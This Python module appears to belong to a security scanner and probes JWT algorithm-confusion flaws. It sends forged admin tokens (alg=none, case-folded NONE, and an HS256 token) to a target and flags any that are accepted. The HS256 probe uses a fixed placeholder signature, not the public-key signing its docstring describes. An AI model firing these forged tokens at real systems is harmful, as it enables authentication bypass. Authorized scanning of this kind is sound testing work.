"""JWT algorithm-confusion scanner.

Probes the three classic JWT algorithm-confusion attacks:

  * ``alg=none`` — token with no signature
  * HS256 → RS256 confusion (sign with the public key as if it were
    an HMAC secret)
  * alg case-folding (``Alg: NONE``) — many legacy libs do case-sensitive
    header parsing
"""

from __future__ import annotations

import base64
import json
import logging
from typing import Any, Dict, List, Tuple

from bugwolf.scanners import Finding, Scanner, make_finding


logger = logging.getLogger(__name__)


def _b64(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _make_jwt(header: Dict[str, Any], payload: Dict[str, Any],
              signature: bytes = b"") -> str:
    h = _b64(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    p = _b64(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    s = _b64(signature)
    return f"{h}.{p}.{s}"


_NONE_JWT = _make_jwt({"alg": "none", "typ": "JWT"},
                     {"sub": "victim", "role": "admin"})
_NONE_JWT_CASEFOLD = _make_jwt({"Alg": "NONE", "typ": "JWT"},
                               {"sub": "victim", "role": "admin"})
_HS256_PUBLIC_CONFUSION = _make_jwt(
    {"alg": "HS256", "typ": "JWT"},
    {"sub": "victim", "role": "admin"},
    signature=b"BugWolfHS256ConfusionSig",
)


class JWTAlgConfusionScanner(Scanner):
    name = "jwt-alg-confusion"
    bug_class = "jwt-alg-confusion"
    default_severity = "critical"
    PAYLOADS: Tuple[str, ...] = (
        _NONE_JWT,
        _NONE_JWT_CASEFOLD,
        _HS256_PUBLIC_CONFUSION,
    )

    def scan(self, target: str, transport) -> List[Finding]:
        if transport is None:
            logger.warning(
                "jwt-alg-confusion: transport is None; returning []"
            )
            return []
        findings: List[Finding] = []
        for token in self.PAYLOADS:
            try:
                resp: Dict[str, Any] = transport(
                    "GET", target,
                    headers={"Authorization": f"Bearer {token}"},
                )
            except Exception as exc:
                logger.debug("jwt: transport error: %s", exc)
                continue
            rbody = (resp.get("body", "") or "").lower()
            if resp.get("status") in (200, 202) and (
                "welcome" in rbody or "dashboard" in rbody
                or "admin" in rbody or "ok" in rbody
            ):
                findings.append(make_finding(
                    self,
                    target=target,
                    evidence="JWT accepted with alg-confusion token",
                    severity="critical",
                    detail={"token_prefix": token[:24],
                            "status": resp.get("status"),
                            "snippet": rbody[:160]},
                ))
        return findings


__all__ = ["JWTAlgConfusionScanner"]